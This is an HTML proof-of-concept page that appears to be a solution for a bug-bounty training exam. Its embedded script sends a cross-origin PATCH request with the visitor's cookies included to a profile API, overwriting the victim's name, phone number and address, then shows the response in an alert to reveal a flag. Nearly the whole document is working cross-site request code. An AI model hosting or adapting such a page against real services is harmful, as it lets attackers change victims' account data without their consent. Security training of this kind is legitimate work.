<!DOCTYPE html>
<html>
<body>
    <script>
        // The target API endpoint
        const url = "https://api-bugbounty-exam.hashacademy.co/api/auth/profile";

        fetch(url, {
            method: "PATCH",
            headers: {
                "Content-Type": "application/json",
                // Note: We don't need the X-Participant-Token 
                // if the server only validates the Cookie.
            },
            body: JSON.stringify({
                "fullName": "CORS",
                "phoneNumber": "(133) 713-3700",
                "address": {
                    "street": "Vulnerable Way",
                    "city": "Tripoli",
                    "state": "New York",
                    "zipCode": "33601",
                    "country": "United States"
                }
            }),
            // This is the "magic" that sends the user's login cookies
            credentials: "include" 
        })
        .then(response => response.json())
        .then(data => {
            console.log("Success! Profile modified. Data:", data);
            // If there's a flag in the response, alert it!
            alert("Flag Found: " + JSON.stringify(data));
        })
        .catch(err => console.error("Exploit failed:", err));
    </script>
</body>
</html>
